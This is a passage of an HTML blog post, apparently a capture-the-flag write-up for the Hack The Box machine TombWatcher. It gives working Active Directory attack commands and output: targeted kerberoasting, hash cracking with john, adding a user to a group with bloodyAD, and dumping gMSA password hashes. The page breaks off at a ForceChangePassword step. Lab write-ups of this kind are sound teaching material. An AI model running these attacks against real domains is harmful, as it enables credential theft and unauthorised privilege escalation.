@@ -1,0 +1,816 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2025/10/11/hackthebox-tombwatcher/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewTombWatcher is a medium-difficulty machine from Hack The Box dealing initially with a few ACL abuses: WriteSPN, AddSelf, ReadGMSAPassword, ForceChangePassword, WriteOwner and later abusing ADC">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: TombWatcher">
+<meta property="og:url" content="http://fouedsaidi.com/2025/10/11/Hackthebox-TombWatcher/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewTombWatcher is a medium-difficulty machine from Hack The Box dealing initially with a few ACL abuses: WriteSPN, AddSelf, ReadGMSAPassword, ForceChangePassword, WriteOwner and later abusing ADC">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/TombWatcher/TombWatcher.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/TombWatcher/writespn.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/TombWatcher/addself.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/TombWatcher/readgmsapassword.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/TombWatcher/forcechangepassword.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/TombWatcher/writeowner.png">
+<meta property="article:published_time" content="2025-10-11T09:22:48.000Z">
+<meta property="article:modified_time" content="2025-10-11T09:41:32.561Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/TombWatcher/TombWatcher.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: TombWatcher -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":null,"zhihu":null,"twitter":"https://twitter.com/_kujen5","email":null,"linkedin":"https://www.linkedin.com/in/foued-saidi-pro/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: TombWatcher</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-10-11 12:22:48</span>
+        <span class="mobile">2025-10-11 12:22:48</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-10-11 12:41:32</span>
+            <span class="mobile">2025-10-11 12:41:32</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>TombWatcher is a medium-difficulty machine from Hack The Box dealing initially with a few ACL abuses: WriteSPN, AddSelf, ReadGMSAPassword, ForceChangePassword, WriteOwner and later abusing ADCS by altering the cert admin svc account password to be able to request a certificate as administrator and authenticate with it</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/TombWatcher/TombWatcher.png"
+                      alt="TombWatcher-info-card"
+                ><figcaption>TombWatcher-info-card</figcaption></figure></p>
+<h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">80/tcp   open  http          Microsoft IIS httpd 10.0</span><br><span class="line">|_http-title: IIS Windows Server</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-13 12:17:29Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=DC01.tombwatcher.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.tombwatcher.htb</span><br><span class="line">| Not valid before: 2024-11-16T00:47:59</span><br><span class="line">|_Not valid after:  2025-11-16T00:47:59</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-06-13T12:19:22+00:00; +3h59m28s from scanner time.</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-06-13T12:19:18+00:00; +3h59m28s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=DC01.tombwatcher.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.tombwatcher.htb</span><br><span class="line">| Not valid before: 2024-11-16T00:47:59</span><br><span class="line">|_Not valid after:  2025-11-16T00:47:59</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=DC01.tombwatcher.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.tombwatcher.htb</span><br><span class="line">| Not valid before: 2024-11-16T00:47:59</span><br><span class="line">|_Not valid after:  2025-11-16T00:47:59</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-06-13T12:19:22+00:00; +3h59m28s from scanner time.</span><br><span class="line">3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-06-13T12:19:18+00:00; +3h59m28s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=DC01.tombwatcher.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.tombwatcher.htb</span><br><span class="line">| Not valid before: 2024-11-16T00:47:59</span><br><span class="line">|_Not valid after:  2025-11-16T00:47:59</span><br><span class="line">5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time:</span><br><span class="line">|   <span class="built_in">date</span>: 2025-06-13T12:18:46</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3:1:1:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: mean: 3h59m26s, deviation: 0s, median: 3h59m27s</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 733.11 seconds</span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that he have a domain controller at our hand resolving to <code>tombwatcher.htb</code> and <code>DC01.tombwatcher.htb</code>. So let’s add these entries to our <code>/etc/hosts</code> file.</p>
+<p>We were also provided with user credentials: </p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- Username: henry</span><br><span class="line">- Password: H3nry_987TGV!</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>We can directly use those credentials to run <code>bloodhound-python</code> to get a better understanding of the system at hand.</p>
+<h3 id="WriteSPN-abuse"><a href="#WriteSPN-abuse" class="headerlink" title="WriteSPN abuse"></a>WriteSPN abuse</h3><p>Directly we jump to checking what our user has as access:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/TombWatcher/writespn.png"
+                      alt="WriteSPN"
+                ><figcaption>WriteSPN</figcaption></figure></p>
+<p>Henry can write the SPN for user ALFRED which will allow him to perform kerberoasting attack on him to crack his hash offline. We can do this using the <code>targetedKerberoast</code> tool:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/targetedKerberoast]</span><br><span class="line">└─$ python3 targetedKerberoast.py -v -d <span class="string">&#x27;tombwatcher.htb&#x27;</span> -u <span class="string">&#x27;henry&#x27;</span> -p <span class="string">&#x27;H3nry_987TGV!&#x27;</span>             </span><br><span class="line">[*] Starting kerberoast attacks</span><br><span class="line">[*] Fetching usernames from Active Directory with LDAP</span><br><span class="line">[+] Printing <span class="built_in">hash</span> <span class="keyword">for</span> (Alfred)</span><br><span class="line">$krb5tgs$23$*Alfred<span class="variable">$TOMBWATCHER</span>.HTB<span class="variable">$tombwatcher</span>.htb/Alfred*$45e2b5e98d4c2ac649294216dc076ec5<span class="variable">$bb9ef83722c4bb8a10e801131dc9cd855cecd612838088d150d8a84caac792035331447c017b4eadc2e529d09b2402ac411736732446c92a48dbb05a6af620aed2d22928445278537653c487874f9861a2d990fd3332463f24f9d224ab19715bd2c8fab0894f1ac97b1c0ec666bda9b6ae725739b24c364df8b7830c929d33edb00f0ed2285406c345303dfbc7e46f66700e8455104358b5cd3e3b19f3b80e285c0b7ea6e20c15cb68831e907e58fe09ebbfccc8fe071a00cea2e65b2fd82ef26e8db96bf579f137f1e5cf97e9dd842679038371aede7f27d4bf167b49c941b03a7c388c048aa214161e9925759e501bcd4b6e8fc98335f885881e3315580f337c4ba9276471a1996f39c1a8594445574bd19931dbec407a23fa12fb4249ed679b4e60c939bd999400155faf131c08d4ad6563b116361ebe86a8c39d8afb3febcafc88dd2f2f4ca026aa29d26e8969f7306918ef0fcd4e0ed38f55075b35a30ade9eabaa56768c7cfdbe6f73e88e62a89c5b2eceb5e22da55466b2d08af2d328037ef04d27e7c338f01226781c02eb172b55ff1e90a5331fa6377d0f7a97fc425b1a6dc4156ba1dc05090164cca69f2480815b6d22a7ffbe3b46ac42b80783ab4f7fffa2afe8dc13a4f3709f60ef2b97f37701d483bce0a3ef107eaaf38cbd61566ae04aa8a4770edfec8eb1b4e624305e66fe60aef015e713417c961858c4c4d65e20f3496f9dcc3df862bf46bf54f574155a7b7d43582439b9119341376251a42b57fa88e921283770e6d73f19dbfc7cafdd38f83b8da602fe1aa60d788f11ebfeec94a101ea5d0e9ba405704410e13289e4abcb7bb9ed16f1069d011e13ed68715b425a7e4a7668a4dc7ba086bd1abe62e41a1d0747d2a1e27024e4fdb1a53f20ea74450f7f1c06dfcaa4a335ff4ea3c2dc4d6ab36ffd2b8f6a117000e97e70893b273f7b9883dbcf263218064b58d1f3a68dfbf6a38f9c679e3e0fccb4e104576eeb109aa9dc23257db4a6e0229195c56aa9acb48df726f15ab37f8777e86e40ec334ee6ed5182dabe3b24472feb3fc7a7e6e0554e54d8d9e61f9054b83af6c49fba515662ed5beeabea2291bb9f849da51261968879c1d9776099e075aa7a8597698e989c8d4ce41c56c107cdde2ade32d5e1ca660867b3e926cd6d7541df82817ac4e721dd42dcb1e94c58bfd3e004a7fd850cfafd9efe4833ad9944da3679c383d73a761f29c2cdee1734989e4c9cab34d8fe46e2b358f0a2eb5ff239ad622179f56f26a006555d950e3fe759414f78ec18221bb479e2f6d42a7d24abf7e180ed8ebc5d2338023aba018e2a6639ecb3be577daf64536affac7a07e7ad07a6c6e10ba5e05fdf10df84872a1b14e5e206159bb736192e939566e3bf6fe9c04f2803aa6ea812be109a472f1a1cf7345d2eff516f40457a76009649d66dd4e467b288bbf57876a73a51f398a42c245e0b1a3c9a</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">──(kali㉿kali)-[~/targetedKerberoast]</span><br><span class="line">└─$ john --wordlist=/usr/share/wordlists/rockyou.txt  <span class="built_in">hash</span></span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">basketball       (?)     </span><br><span class="line">1g 0:00:00:00 DONE (2025-06-13 08:17) 100.0g/s 102400p/s 102400c/s 102400C/s 123456..bethany</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br></pre></td></tr></table></figure></div>
+
+<p>We get ALFRED’s password: <code>basketball</code></p>
+<h3 id="AddSelf-to-INFRASTRUCTURE-group"><a href="#AddSelf-to-INFRASTRUCTURE-group" class="headerlink" title="AddSelf to INFRASTRUCTURE group"></a>AddSelf to INFRASTRUCTURE group</h3><p>Moving forward, ALFRED can add himself to INFRASTRUCTURE group:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/TombWatcher/addself.png"
+                      alt="AddSelf"
+                ><figcaption>AddSelf</figcaption></figure></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/targetedKerberoast]</span><br><span class="line">└─$ bloodyAD -u <span class="string">&#x27;alfred&#x27;</span> -p <span class="string">&#x27;basketball&#x27;</span> -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE <span class="string">&#x27;alfred&#x27;</span></span><br><span class="line">[+] alfred added to INFRASTRUCTURE</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="ReadGMSAPassword-of-ANSIBLE-DEVS"><a href="#ReadGMSAPassword-of-ANSIBLE-DEVS" class="headerlink" title="ReadGMSAPassword of ANSIBLE_DEVS$"></a>ReadGMSAPassword of ANSIBLE_DEVS$</h3><p>And that group can later read the GMSA passwords of ANSIBLE_DEVS$ machine account:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/TombWatcher/readgmsapassword.png"
+                      alt="ReadGMSAPassword"
+                ><figcaption>ReadGMSAPassword</figcaption></figure></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/gMSADumper]</span><br><span class="line">└─$ python3 gMSADumper.py -u <span class="string">&#x27;alfred&#x27;</span> -p <span class="string">&#x27;basketball&#x27;</span> -d <span class="string">&#x27;tombwatcher.htb&#x27;</span></span><br><span class="line">Users or <span class="built_in">groups</span> <span class="built_in">who</span> can <span class="built_in">read</span> password <span class="keyword">for</span> ansible_dev$:</span><br><span class="line"> &gt; Infrastructure</span><br><span class="line">ansible_dev$:::1c37d00093dc2a5f25176bf2d474afdc</span><br><span class="line">ansible_dev$:aes256-cts-hmac-sha1-96:526688ad2b7ead7566b70184c518ef665cc4c0215a1d634ef5f5bcda6543b5b3</span><br><span class="line">ansible_dev$:aes128-cts-hmac-sha1-96:91366223f82cd8d39b0e767f0061fd9a</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="ForceChangePassword-for-SAM"><a href="#ForceChangePassword-for-SAM" class="headerlink" title="ForceChangePassword for SAM"></a>ForceChangePassword for SAM</h3><p>The machine account can forcibly change the password of SAM user:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/TombWatcher/forcechangepassword.png"
+                      alt="ForceChangePassword"
+                ><figcaption>ForceChangePassword</figcaption></figure></p>
